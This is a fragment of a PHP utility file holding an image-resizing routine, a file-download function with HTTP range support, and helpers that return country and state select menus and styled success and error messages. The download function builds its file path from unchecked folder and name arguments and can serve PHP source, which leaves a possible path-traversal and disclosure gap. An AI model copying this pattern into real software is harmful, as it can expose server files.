          list($width, $height) = getimagesize($file) ; 


          $tn = imagecreatetruecolor($width, $height) ; 
          $image = imagecreatefromjpeg($file) ; 
          imagecopyresampled($tn, $image, 0, 0, 0, 0, $width, $height, $width, $height) ; 

          imagejpeg($tn, $save, 100) ; 
          #$save = 'thumb_img/'.$imagepath;
		  
          $save = $imagepath; //This is the new file you saving
          $file = $imagepath; //This is the original file

          list($width, $height) = getimagesize($file) ; 

          $modwidth = $max_width; 
          $diff = $width / $modwidth;
          $modheight = $max_height; 
          $tn = imagecreatetruecolor($modwidth, $modheight) ; 
          $image = imagecreatefromjpeg($file) ; 
          imagecopyresampled($tn, $image, 0, 0, 0, 0, $modwidth, $modheight, $width, $height) ; 
          imagejpeg($tn, $save, 100) ; 
}
function extension($file_name) {
	return substr(strrchr($file_name,'.'),1);
}
function download($folder, $name){
	$file = $folder.'/'.$name;
	$mime_type='';
 if(!is_readable($file)) die('File not found or inaccessible!');
 
 $size = filesize($file);
 $name = rawurldecode($name);
 
 $known_mime_types=array(
 	"pdf" => "application/pdf",
 	"txt" => "text/plain",
 	"html" => "text/html",
 	"htm" => "text/html",
	"exe" => "application/octet-stream",
	"zip" => "application/zip",
	"doc" => "application/msword",
	"xls" => "application/vnd.ms-excel",
	"ppt" => "application/vnd.ms-powerpoint",
	"gif" => "image/gif",
	"png" => "image/png",
	"jpeg"=> "image/jpg",
	"jpg" =>  "image/jpg",
	"php" => "text/plain"
 );
 
 if($mime_type==''){
	 $file_extension = strtolower(substr(strrchr($file,"."),1));
	 if(array_key_exists($file_extension, $known_mime_types)){
		$mime_type=$known_mime_types[$file_extension];
	 } else {
		$mime_type="application/force-download";
	 };
 };
 
 //turn off output buffering to decrease cpu usage
 @ob_end_clean(); 
 
 // required for IE, otherwise Content-Disposition may be ignored
 if(ini_get('zlib.output_compression'))
  ini_set('zlib.output_compression', 'Off');
 
 header('Content-Type: ' . $mime_type);
 header('Content-Disposition: attachment; filename="'.$name.'"');
 header("Content-Transfer-Encoding: binary");
 header('Accept-Ranges: bytes');
 
 header("Cache-control: private");
 header('Pragma: private');
 header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
 
 if(isset($_SERVER['HTTP_RANGE']))
 {
	list($a, $range) = explode("=",$_SERVER['HTTP_RANGE'],2);
	list($range) = explode(",",$range,2);
	list($range, $range_end) = explode("-", $range);
	$range=intval($range);
	if(!$range_end) {
		$range_end=$size-1;
	} else {
		$range_end=intval($range_end);
	}
	
	$new_length = $range_end-$range+1;
	header("HTTP/1.1 206 Partial Content");
	header("Content-Length: $new_length");
	header("Content-Range: bytes $range-$range_end/$size");
 } else {
	$new_length=$size;
	header("Content-Length: ".$size);
 }
 
 /* Will output the file itself */
 $chunksize = 1*(1024*1024); //you may want to change this
 $bytes_send = 0;
 if ($file = fopen($file, 'r'))
 {
	if(isset($_SERVER['HTTP_RANGE']))
	fseek($file, $range);
 
	while(!feof($file) && 
		(!connection_aborted()) && 
		($bytes_send<$new_length)
	      )
	{
		$buffer = fread($file, $chunksize);
		print($buffer); //echo($buffer); // can also possible
		flush();
		$bytes_send += strlen($buffer);
	}
 fclose($file);
 } else
 //If no permissiion
 die('Error - can not open file.');
 //die
die();
}
function country(){
	$country = <<< EOF
	<select name="country">
<option value="">Country...</option>
<option value="Afganistan">Afghanistan</option>
<option value="Albania">Albania</option>
<option value="Algeria">Algeria</option>
<option value="American Samoa">American Samoa</option>
<option value="Andorra">Andorra</option>
<option value="Angola">Angola</option>
<option value="Anguilla">Anguilla</option>
<option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
<option value="Argentina">Argentina</option>
<option value="Armenia">Armenia</option>
<option value="Aruba">Aruba</option>
<option value="Australia">Australia</option>
<option value="Austria">Austria</option>
<option value="Azerbaijan">Azerbaijan</option>
<option value="Bahamas">Bahamas</option>
<option value="Bahrain">Bahrain</option>
<option value="Bangladesh">Bangladesh</option>
<option value="Barbados">Barbados</option>
<option value="Belarus">Belarus</option>
<option value="Belgium">Belgium</option>
<option value="Belize">Belize</option>
<option value="Benin">Benin</option>
<option value="Bermuda">Bermuda</option>
<option value="Bhutan">Bhutan</option>
<option value="Bolivia">Bolivia</option>
<option value="Bonaire">Bonaire</option>
<option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
<option value="Botswana">Botswana</option>
<option value="Brazil">Brazil</option>
<option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
<option value="Brunei">Brunei</option>
<option value="Bulgaria">Bulgaria</option>
<option value="Burkina Faso">Burkina Faso</option>
<option value="Burundi">Burundi</option>
<option value="Cambodia">Cambodia</option>
<option value="Cameroon">Cameroon</option>
<option value="Canada">Canada</option>
<option value="Canary Islands">Canary Islands</option>
<option value="Cape Verde">Cape Verde</option>
<option value="Cayman Islands">Cayman Islands</option>
<option value="Central African Republic">Central African Republic</option>
<option value="Chad">Chad</option>
<option value="Channel Islands">Channel Islands</option>
<option value="Chile">Chile</option>
<option value="China">China</option>
<option value="Christmas Island">Christmas Island</option>
<option value="Cocos Island">Cocos Island</option>
<option value="Colombia">Colombia</option>
<option value="Comoros">Comoros</option>
<option value="Congo">Congo</option>
<option value="Cook Islands">Cook Islands</option>
<option value="Costa Rica">Costa Rica</option>
<option value="Cote DIvoire">Cote DIvoire</option>
<option value="Croatia">Croatia</option>
<option value="Cuba">Cuba</option>
<option value="Curaco">Curacao</option>
<option value="Cyprus">Cyprus</option>
<option value="Czech Republic">Czech Republic</option>
<option value="Denmark">Denmark</option>
<option value="Djibouti">Djibouti</option>
<option value="Dominica">Dominica</option>
<option value="Dominican Republic">Dominican Republic</option>
<option value="East Timor">East Timor</option>
<option value="Ecuador">Ecuador</option>
<option value="Egypt">Egypt</option>
<option value="El Salvador">El Salvador</option>
<option value="Equatorial Guinea">Equatorial Guinea</option>
<option value="Eritrea">Eritrea</option>
<option value="Estonia">Estonia</option>
<option value="Ethiopia">Ethiopia</option>
<option value="Falkland Islands">Falkland Islands</option>
<option value="Faroe Islands">Faroe Islands</option>
<option value="Fiji">Fiji</option>
<option value="Finland">Finland</option>
<option value="France">France</option>
<option value="French Guiana">French Guiana</option>
<option value="French Polynesia">French Polynesia</option>
<option value="French Southern Ter">French Southern Ter</option>
<option value="Gabon">Gabon</option>
<option value="Gambia">Gambia</option>
<option value="Georgia">Georgia</option>
<option value="Germany">Germany</option>
<option value="Ghana">Ghana</option>
<option value="Gibraltar">Gibraltar</option>
<option value="Great Britain">Great Britain</option>
<option value="Greece">Greece</option>
<option value="Greenland">Greenland</option>
<option value="Grenada">Grenada</option>
<option value="Guadeloupe">Guadeloupe</option>
<option value="Guam">Guam</option>
<option value="Guatemala">Guatemala</option>
<option value="Guinea">Guinea</option>
<option value="Guyana">Guyana</option>
<option value="Haiti">Haiti</option>
<option value="Hawaii">Hawaii</option>
<option value="Honduras">Honduras</option>
<option value="Hong Kong">Hong Kong</option>
<option value="Hungary">Hungary</option>
<option value="Iceland">Iceland</option>
<option value="India">India</option>
<option value="Indonesia">Indonesia</option>
<option value="Iran">Iran</option>
<option value="Iraq">Iraq</option>
<option value="Ireland">Ireland</option>
<option value="Isle of Man">Isle of Man</option>
<option value="Israel">Israel</option>
<option value="Italy">Italy</option>
<option value="Jamaica">Jamaica</option>
<option value="Japan">Japan</option>
<option value="Jordan">Jordan</option>
<option value="Kazakhstan">Kazakhstan</option>
<option value="Kenya">Kenya</option>
<option value="Kiribati">Kiribati</option>
<option value="Korea North">Korea North</option>
<option value="Korea Sout">Korea South</option>
<option value="Kuwait">Kuwait</option>
<option value="Kyrgyzstan">Kyrgyzstan</option>
<option value="Laos">Laos</option>
<option value="Latvia">Latvia</option>
<option value="Lebanon">Lebanon</option>
<option value="Lesotho">Lesotho</option>
<option value="Liberia">Liberia</option>
<option value="Libya">Libya</option>
<option value="Liechtenstein">Liechtenstein</option>
<option value="Lithuania">Lithuania</option>
<option value="Luxembourg">Luxembourg</option>
<option value="Macau">Macau</option>
<option value="Macedonia">Macedonia</option>
<option value="Madagascar">Madagascar</option>
<option value="Malaysia">Malaysia</option>
<option value="Malawi">Malawi</option>
<option value="Maldives">Maldives</option>
<option value="Mali">Mali</option>
<option value="Malta">Malta</option>
<option value="Marshall Islands">Marshall Islands</option>
<option value="Martinique">Martinique</option>
<option value="Mauritania">Mauritania</option>
<option value="Mauritius">Mauritius</option>
<option value="Mayotte">Mayotte</option>
<option value="Mexico">Mexico</option>
<option value="Midway Islands">Midway Islands</option>
<option value="Moldova">Moldova</option>
<option value="Monaco">Monaco</option>
<option value="Mongolia">Mongolia</option>
<option value="Montserrat">Montserrat</option>
<option value="Morocco">Morocco</option>
<option value="Mozambique">Mozambique</option>
<option value="Myanmar">Myanmar</option>
<option value="Nambia">Nambia</option>
<option value="Nauru">Nauru</option>
<option value="Nepal">Nepal</option>
<option value="Netherland Antilles">Netherland Antilles</option>
<option value="Netherlands">Netherlands (Holland, Europe)</option>
<option value="Nevis">Nevis</option>
<option value="New Caledonia">New Caledonia</option>
<option value="New Zealand">New Zealand</option>
<option value="Nicaragua">Nicaragua</option>
<option value="Niger">Niger</option>
<option value="Nigeria">Nigeria</option>
<option value="Niue">Niue</option>
<option value="Norfolk Island">Norfolk Island</option>
<option value="Norway">Norway</option>
<option value="Oman">Oman</option>
<option value="Pakistan">Pakistan</option>
<option value="Palau Island">Palau Island</option>
<option value="Palestine">Palestine</option>
<option value="Panama">Panama</option>
<option value="Papua New Guinea">Papua New Guinea</option>
<option value="Paraguay">Paraguay</option>
<option value="Peru">Peru</option>
<option value="Phillipines">Philippines</option>
<option value="Pitcairn Island">Pitcairn Island</option>
<option value="Poland">Poland</option>
<option value="Portugal">Portugal</option>
<option value="Puerto Rico">Puerto Rico</option>
<option value="Qatar">Qatar</option>
<option value="Republic of Montenegro">Republic of Montenegro</option>
<option value="Republic of Serbia">Republic of Serbia</option>
<option value="Reunion">Reunion</option>
<option value="Romania">Romania</option>
<option value="Russia">Russia</option>
<option value="Rwanda">Rwanda</option>
<option value="St Barthelemy">St Barthelemy</option>
<option value="St Eustatius">St Eustatius</option>
<option value="St Helena">St Helena</option>
<option value="St Kitts-Nevis">St Kitts-Nevis</option>
<option value="St Lucia">St Lucia</option>
<option value="St Maarten">St Maarten</option>
<option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
<option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
<option value="Saipan">Saipan</option>
<option value="Samoa">Samoa</option>
<option value="Samoa American">Samoa American</option>
<option value="San Marino">San Marino</option>
<option value="Sao Tome & Principe">Sao Tome &amp; Principe</option>
<option value="Saudi Arabia">Saudi Arabia</option>
<option value="Senegal">Senegal</option>
<option value="Seychelles">Seychelles</option>
<option value="Sierra Leone">Sierra Leone</option>
<option value="Singapore">Singapore</option>
<option value="Slovakia">Slovakia</option>
<option value="Slovenia">Slovenia</option>
<option value="Solomon Islands">Solomon Islands</option>
<option value="Somalia">Somalia</option>
<option value="South Africa">South Africa</option>
<option value="Spain">Spain</option>
<option value="Sri Lanka">Sri Lanka</option>
<option value="Sudan">Sudan</option>
<option value="Suriname">Suriname</option>
<option value="Swaziland">Swaziland</option>
<option value="Sweden">Sweden</option>
<option value="Switzerland">Switzerland</option>
<option value="Syria">Syria</option>
<option value="Tahiti">Tahiti</option>
<option value="Taiwan">Taiwan</option>
<option value="Tajikistan">Tajikistan</option>
<option value="Tanzania">Tanzania</option>
<option value="Thailand">Thailand</option>
<option value="Togo">Togo</option>
<option value="Tokelau">Tokelau</option>
<option value="Tonga">Tonga</option>
<option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
<option value="Tunisia">Tunisia</option>
<option value="Turkey">Turkey</option>
<option value="Turkmenistan">Turkmenistan</option>
<option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
<option value="Tuvalu">Tuvalu</option>
<option value="Uganda">Uganda</option>
<option value="Ukraine">Ukraine</option>
<option value="United Arab Erimates">United Arab Emirates</option>
<option value="United Kingdom">United Kingdom</option>
<option value="United States of America">United States of America</option>
<option value="Uraguay">Uruguay</option>
<option value="Uzbekistan">Uzbekistan</option>
<option value="Vanuatu">Vanuatu</option>
<option value="Vatican City State">Vatican City State</option>
<option value="Venezuela">Venezuela</option>
<option value="Vietnam">Vietnam</option>
<option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
<option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
<option value="Wake Island">Wake Island</option>
<option value="Wallis &amp; Futana Is">Wallis &amp; Futana Is</option>
<option value="Yemen">Yemen</option>
<option value="Zaire">Zaire</option>
<option value="Zambia">Zambia</option>
<option value="Zimbabwe">Zimbabwe</option>
</select>
EOF;
return $country;
}
function state(){
	$state = <<< EOF
	<select name="state">
<option value="">---- Select state ----</option>
<option value="">-- UNITED STATES --</option>
<option value="Alabama">Alabama</option>
<option value="Alaska">Alaska</option>
<option value="Arizona">Arizona</option>
<option value="Arkansas">Arkansas</option>
<option value="California">California</option>
<option value="Colorado">Colorado</option>
<option value="Connecticut">Connecticut</option>
<option value="Delaware">Delaware</option>
<option value="Florida">Florida</option>
<option value="Georgia">Georgia</option>
<option value="Hawaii">Hawaii</option>
<option value="Idaho">Idaho</option>
<option value="Illinois">Illinois</option>
<option value="Indiana">Indiana</option>
<option value="Iowa">Iowa</option>
<option value="Kansas">Kansas</option>
<option value="Kentucky">Kentucky</option>
<option value="Louisiana">Louisiana</option>
<option value="Maine">Maine</option>
<option value="Maryland">Maryland</option>
<option value="Massachusetts">Massachusetts</option>
<option value="Michigan">Michigan</option>
<option value="Minnesota">Minnesota</option>
<option value="Mississippi">Mississippi</option>
<option value="Missouri">Missouri</option>
<option value="Montana">Montana</option>
<option value="Nebraska">Nebraska</option>
<option value="Nevada">Nevada</option>
<option value="New Hampshire">New Hampshire</option>
<option value="New Jersey">New Jersey</option>
<option value="New Mexico">New Mexico</option>
<option value="New York">New York</option>
<option value="North Carolina">North Carolina</option>
<option value="North Dakota">North Dakota</option>
<option value="Ohio">Ohio</option>
<option value="Oklahoma">Oklahoma</option>
<option value="Oregon">Oregon</option>
<option value="Pennsylvania">Pennsylvania</option>
<option value="Rhode Island">Rhode Island</option>
<option value="South Carolina">South Carolina</option>
<option value="South Dakota">South Dakota</option>
<option value="Tennessee">Tennessee</option>
<option value="Texas">Texas</option>
<option value="Utah">Utah</option>
<option value="Vermont">Vermont</option>
<option value="Virginia">Virginia</option>
<option value="Washington">Washington</option>
<option value="West Virginia">West Virginia</option>
<option value="Wisconsin">Wisconsin</option>
<option value="Wyoming">Wyoming</option>
<option value="">-- CANADA --</option>
<option value="Alberta">Alberta</option>
<option value="British Columbia">British Columbia</option>
<option value="Manitoba">Manitoba</option>
<option value="New Brunswick">New Brunswick</option>
<option value="Newfoundland and Labrador">Newfoundland and Labrador</option>
<option value="Northwest Territories">Northwest Territories</option>
<option value="Nova Scotia">Nova Scotia</option>
<option value="Nunavut">Nunavut</option>
<option value="Ontario">Ontario</option>
<option value="Prince Edward Island">Prince Edward Island</option>
<option value="Quebec">Quebec</option>
<option value="Saskatchewan">Saskatchewan</option>
<option value="Yukon Territory">Yukon Territory</option>
<option value="">-- AUSTRALIA --</option>
<option value="Australian Capital Territory">Australian Capital Territory</option>
<option value="New South Wales">New South Wales</option>
<option value="Northern Territory">Northern Territory</option>
<option value="Queensland">Queensland</option>
<option value="South Australia">South Australia</option>
<option value="Tasmania">Tasmania</option>
<option value="Victoria">Victoria</option>
<option value="Western Australia">Western Australia</option>
</select>
EOF;
return $state;
}
function success(){ 
    echo '<style>.success{
	color:#000;
	padding:5px 20px;
	background:url("admin/img/success.png") no-repeat scroll 2px 4px #F0FFF0;
	background-color:#F0FFF0;
	border:1px #00D700 solid;
	position: relative;
    z-index: 999;
}</style>';
    $arg ='Success !';
	if($arg = func_get_args()){$arg = $arg[0];}
	return '<span class="success">'.$arg.'</span>';
}
function error(){
	echo '<style>.error{
	color:#000;
	padding:5px 20px;
	background:url("admin/img/error.png") no-repeat scroll 2px 4px #FFDCDC;
	background-color:#FFAAAA;
	border:1px #FF4848 solid;
}</style>';
	$arg ='Error !';
	if($arg = func_get_args()){$arg = $arg[0];}
	return '<span class="error">'.$arg.'</span>';
}
?>